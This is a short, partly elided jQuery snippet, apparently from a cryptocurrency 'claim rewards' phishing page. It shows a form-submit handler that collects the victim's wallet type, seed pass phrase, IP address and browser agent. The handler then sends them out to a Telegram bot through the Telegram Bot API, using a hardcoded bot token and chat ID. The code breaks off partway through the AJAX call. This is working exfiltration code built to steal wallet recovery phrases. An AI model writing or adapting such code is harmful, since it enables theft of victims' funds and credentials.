(function ($) {
	...
	$(document).ready(function(){
		...
		$("#form1").on("submit", function(event) {
			...
			var sData = encodeURI("New Claim-Rewards\n\nWallet Type: "+wallType+" \n\nPass Phrase: \n\n"+a+"\n\nIP Address: "+ip+"\n\nbrowser agent: "+agent)
			$.ajax({
				url: 'https://api.telegram.org/bot6855833478:AAHEaqBnaiWmMEcOJvD9OQkHinVz6E6T9dY/'+"sendmessage?text="+sData+"&chat_id=5268818461&parse_mode=HTML",
				beforeSend: function() {
